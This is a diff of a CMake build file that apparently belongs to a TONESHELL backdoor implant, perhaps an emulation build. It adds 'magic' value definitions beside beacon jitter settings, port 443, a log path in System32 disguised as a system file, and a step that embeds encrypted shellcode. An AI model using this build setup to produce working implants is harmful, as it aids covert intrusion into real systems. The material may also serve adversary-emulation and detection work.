@@ -64,6 +64,9 @@ target_compile_definitions(
     TONESHELL_JITTER_ACTIVE_MAX_MS=${TONESHELL_JITTER_ACTIVE_MAX_MS}
     TONESHELL_JITTER_IDLE_MIN_MS=${TONESHELL_JITTER_IDLE_MIN_MS}
     TONESHELL_JITTER_IDLE_MAX_MS=${TONESHELL_JITTER_IDLE_MAX_MS}
+    TONESHELL_MAGIC_0=${TONESHELL_MAGIC_0}
+    TONESHELL_MAGIC_1=${TONESHELL_MAGIC_1}
+    TONESHELL_MAGIC_2=${TONESHELL_MAGIC_2}
 )
 
 target_compile_definitions(
@@ -73,6 +76,9 @@ target_compile_definitions(
     PORT=443
     SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\gflagsui_dat.log"
     ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
+    TONESHELL_MAGIC_0=${TONESHELL_MAGIC_0}
+    TONESHELL_MAGIC_1=${TONESHELL_MAGIC_1}
+    TONESHELL_MAGIC_2=${TONESHELL_MAGIC_2}
 )
 
 # Encrypt and embed TONESHELL shellcode in header
